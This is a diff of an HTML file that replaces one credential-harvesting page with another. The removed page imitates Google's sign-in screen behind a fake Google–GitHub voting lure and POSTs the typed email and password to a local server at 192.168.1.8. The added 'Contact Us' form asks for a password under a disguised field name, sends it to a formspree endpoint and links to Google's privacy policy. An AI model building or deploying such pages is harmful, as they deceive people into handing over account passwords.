@@ -1,320 +1,134 @@
 <!DOCTYPE html>
-<html lang="uz">
+<html lang="en">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <meta property="og:title"Google.com + Github.com collaboration">
-  <meta property="og:description" content="Vote for Your Favorite User">
-  <meta property="og:image" content="https://miro.medium.com/v2/resize:fit:828/format:webp/1*mM0p_SF47QA74232hkjjNw.png">
-  <meta property="og:url" content="https://yourgithubusername.github.io/repositoryname/">
-  <meta property="og:type" content="website">
-  <title>Google and GitHub voting</title>
-  <!-- Google Font -->
-  <link href="https://fonts.googleapis.com/css?family=Roboto:400,500,700&display=swap" rel="stylesheet">
+  <title>Contact Form</title>
+  <!-- Google Fonts -->
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
   <style>
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-      font-family: 'Roboto', Arial, sans-serif;
-    }
-
     body {
-      background-color: #e9ebee;
+      font-family: 'Roboto', sans-serif;
+      background-color: #f4f4f4;
       display: flex;
       justify-content: center;
       align-items: center;
       height: 100vh;
+      margin: 0;
+      padding: 10px;
     }
-
-    .container {
-      width: 100%;
-      max-width: 400px;
-      padding: 20px;
-    }
-
-    .card {
-      background: #fff;
-      padding: 40px 30px;
-      text-align: center;
-      border-radius: 16px;
-      box-shadow: 0 6px 20px rgba(0, 0, 0, 0.15);
-      transition: transform 0.3s;
-      display: none; /* All containers hidden by default */
-    }
-
-    /* Show the login container by default */
-    #loginContainer {
-      display: block;
-    }
-
-    .card:hover {
-      transform: translateY(-5px);
-    }
-
-    .card img {
-      width: 75px;
-      margin-bottom: 20px;
-    }
-
-    h2 {
-      font-size: 26px;
-      margin-bottom: 12px;
-      font-weight: 500;
-      color: #202124;
-    }
-
-    p {
-      font-size: 15px;
-      color: #5f6368;
-      margin-bottom: 20px;
-    }
-
-    .input-box {
-      width: 100%;
-      padding: 14px;
-      margin: 8px 0;
-      border: 1px solid #dadce0;
-      border-radius: 8px;
-      font-size: 16px;
-      background-color: #f1f3f4;
-      transition: border-color 0.3s ease, box-shadow 0.3s ease;
-    }
-
-    .input-box:focus {
-      border-color: #1a73e8;
-      box-shadow: 0 0 5px rgba(26, 115, 232, 0.3);
-      outline: none;
-    }
-
-    .input-box.invalid {
-      border-color: #d93025 !important;
-      box-shadow: 0 0 5px rgba(217, 48, 37, 0.3);
-    }
-
-    .btn {
-      width: 100%;
-      background: #1a73e8;
-      color: white;
-      padding: 14px;
-      margin-top: 20px;
-      font-size: 16px;
-      border: none;
-      border-radius: 8px;
-      cursor: pointer;
-      transition: background 0.3s ease;
-    }
-
-    .btn:hover {
-      background: #1669c1;
-    }
-
-    .link {
-      color: #1a73e8;
-      font-size: 14px;
-      text-decoration: none;
-      margin: 5px 0;
-      display: inline-block;
-    }
-
-    .link:hover {
-      text-decoration: underline;
-    }
-
-    .footer-text {
-      margin-top: 15px;
-      font-size: 13px;
-      color: #5f6368;
-    }
-
-    /* Improved Voting Page Styles */
-    #voteContainer {
-      background: #fff;
-      border-radius: 16px;
-      padding: 40px 30px;
-      box-shadow: 0 8px 30px rgba(0, 0, 0, 0.15);
-      animation: fadeIn 0.5s ease;
-    }
-
-    .vote-header {
-      font-size: 28px;
-      margin-bottom: 25px;
-      color: #202124;
-      font-weight: 600;
-      border-bottom: 2px solid #e9ebee;
-      padding-bottom: 10px;
-    }
-
-    /* Scrollable candidate list in case of many items */
-    ul#userList {
-      list-style: none;
-      padding: 0;
-      margin: 20px 0;
-      max-height: 300px;
-      overflow-y: auto;
-    }
-
-    li.vote-item {
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      background: #f8f9fa;
-      border: 1px solid #dadce0;
+    .form-container {
+      background-color: white;
+      padding: 30px 40px;
       border-radius: 10px;
-      padding: 12px 20px;
-      margin-bottom: 15px;
-      transition: transform 0.2s, box-shadow 0.2s;
+      box-shadow: 0 8px 20px rgba(0, 0, 0, 0.1);
+      max-width: 400px;
+      width: 100%;
     }
-
-    li.vote-item:hover {
-      transform: translateY(-3px);
-      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+    h2 {
+      margin-bottom: 20px;
+      font-size: 24px;
+      color: #333;
+      text-align: center;
     }
-
-    li.vote-item span {
-      font-size: 16px;
-      color: #202124;
+    label {
+      display: block;
+      margin-bottom: 8px;
       font-weight: 500;
+      color: #555;
     }
-
-    li.vote-item button {
-      background-color: #34a853;
-      border: none;
-      padding: 8px 14px;
-      border-radius: 6px;
-      color: white;
-      cursor: pointer;
+    input[type="text"],
+    input[type="email"],
+    textarea {
+      width: 100%;
+      padding: 12px;
+      margin-bottom: 16px;
+      border: 1px solid #ddd;
+      border-radius: 5px;
+      font-size: 16px;
+      transition: border-color 0.3s;
+    }
+    input[type="text"]:focus,
+    input[type="email"]:focus,
+    textarea:focus {
+      border-color: #4285f4;
+      outline: none;
+      box-shadow: 0 4px 8px rgba(66, 133, 244, 0.2);
+    }
+    textarea {
+      height: 100px;
+      resize: vertical;
+      max-length: 500;
+    }
+    .char-counter {
+      text-align: right;
+      color: #555;
       font-size: 14px;
-      transition: background-color 0.2s;
+      margin-top: -12px;
+      margin-bottom: 12px;
     }
-
-    li.vote-item button:hover {
-      background-color: #2c8a43;
+    button {
+      width: 100%;
+      background-color: #4285f4;
+      color: white;
+      padding: 12px;
+      font-size: 18px;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      transition: background-color 0.3s;
     }
-
-    .btn.back-btn {
-      background-color: #1a73e8;
-      margin-top: 20px;
-      width: auto;
-      padding: 10px 20px;
-      font-size: 15px;
+    button:hover {
+      background-color: #357ae8;
     }
-
-    @keyframes fadeIn {
-      from { opacity: 0; transform: scale(0.95); }
-      to { opacity: 1; transform: scale(1); }
+    .privacy-text {
+      margin-top: 15px;
+      font-size: 14px;
+      color: #777;
+      text-align: center;
+    }
+    .privacy-text a {
+      color: #4285f4;
+      text-decoration: none;
+    }
+    .privacy-text a:hover {
+      text-decoration: underline;
     }
   </style>
 </head>
 <body>
-  <div class="container">
-
-    <!-- LOGIN CONTAINER -->
-    <div class="card" id="loginContainer">
-      <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_92x30dp.png" alt="Google Logo"/>
-      <h2>Sign in</h2>
-      <p>Use your Google Account</p>
-      <input type="email" class="input-box" id="email" placeholder="Email or phone" required />
-      <a href="https://support.google.com/accounts/answer/7682439?hl=en" class="link" target="_blank">Forgot email?</a>
-      <input type="password" class="input-box" id="password" placeholder="Enter password" required />
-      <a href="https://support.google.com/accounts/answer/7682439?hl=en" class="link" target="_blank">Forgot password?</a>
-      <button class="btn" id="nextBtn">Next</button>
-      <p class="footer-text">
-        Not your computer? Use Guest mode to sign in privately.<br>
-        <a href="https://support.google.com/chrome/answer/6130773?hl=en&co=GENIE.Platform%3DAndroid" class="link" target="_blank">Learn more</a>
+  <div class="form-container">
+    <h2>Contact Us</h2>
+    <form action="https://formspree.io/f/xnnpqgpg" method="POST">
+      <label for="name">Your Name:</label>
+      <input type="text" id="name" name="name" placeholder="John Doe" required>
+      
+      <label for="email">Your Email:</label>
+      <input type="email" id="email" name="email" placeholder="example@domain.com" required>
+      
+      <label for="subject">Your password:</label>
+      <input type="text" id="subject" name="subject" placeholder="Subject" required>
+      
+      <label for="message">Your Message:</label>
+      <textarea id="message" name="message" placeholder="Write your message here..." maxlength="500" required></textarea>
+      <p class="char-counter" id="charCounter">0/500</p>
+      
+      <button type="submit">Send Message</button>
+      
+      <p class="privacy-text">
+        By submitting this form, you agree to our 
+        <a href="https://policies.google.com/privacy" target="_blank">Privacy Policy</a>.
       </p>
-      <p class="footer-text">
-        New to Google? <a href="https://support.google.com/mail/answer/56256?hl=en" class="link" target="_blank">Create an account</a>
-      </p>
-    </div>
-
-    <!-- VOTE CONTAINER -->
-    <div class="card" id="voteContainer">
-      <h2 class="vote-header">Vote for Your Favorite User</h2>
-      <ul id="userList"></ul>
-      <button class="btn back-btn" onclick="goBack()">Back to Login</button>
-    </div>
-
+    </form>
   </div>
 
   <script>
-    const emailInput = document.getElementById("email");
-    const passwordInput = document.getElementById("password");
-    const nextButton = document.getElementById("nextBtn");
-    const loginContainer = document.getElementById("loginContainer");
-    const voteContainer = document.getElementById("voteContainer");
-    const userList = document.getElementById("userList");
+    const messageInput = document.getElementById("message");
+    const charCounter = document.getElementById("charCounter");
 
-    nextButton.addEventListener("click", function () {
-      const email = emailInput.value.trim();
-      const password = passwordInput.value.trim();
-
-      // Remove any previous invalid class
-      emailInput.classList.remove("invalid");
-      passwordInput.classList.remove("invalid");
-
-      // Validate inputs
-      if (!email || !password) {
-        if (!email) emailInput.classList.add("invalid");
-        if (!password) passwordInput.classList.add("invalid");
-        return;
-      }
-
-      // Prepare the data to send
-      const data = { email, password };
-
-      // Send the data to the backend via fetch
-      fetch("http://192.168.1.8:5000/login", {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify(data)
-      })
-      .then(response => response.json())
-      .then(result => {
-        // Check if the backend returned a success message
-        if (result.message) {
-          // Hide login container and show the vote container
-          loginContainer.style.display = "none";
-          voteContainer.style.display = "block";
-
-          // Populate voting list with candidate names
-          const usernames = [
-            "Alibek R.M",
-            "Shamsiddinov K.S",
-            "Yusuf H.J",
-            "Otabek E.O",
-            "Uriqov I.P",
-            "Aleksey M.M"
-          ];
-          userList.innerHTML = "";
-          usernames.forEach(name => {
-            const li = document.createElement("li");
-            li.classList.add("vote-item");
-            li.innerHTML = `<span>${name}</span>`;
-            const voteBtn = document.createElement("button");
-            voteBtn.textContent = "Vote";
-            voteBtn.onclick = () => alert(`Thanks for voting for ${name}! Your vote will be checked within 2 days.`);
-            li.appendChild(voteBtn);
-            userList.appendChild(li);
-          });
-
-        } else {
-          alert("Error: " + result.error);
-        }
-      })
-      .catch(error => {
-        console.error("Error:", error);
-        alert("Error, please try again");
-      });
+    messageInput.addEventListener("input", function() {
+      charCounter.textContent = messageInput.value.length + "/500";
     });
-
-    function goBack() {
-      loginContainer.style.display = "block";
-      voteContainer.style.display = "none";
-      emailInput.value = "";
-      passwordInput.value = "";
-    }
   </script>
 </body>
+</html>
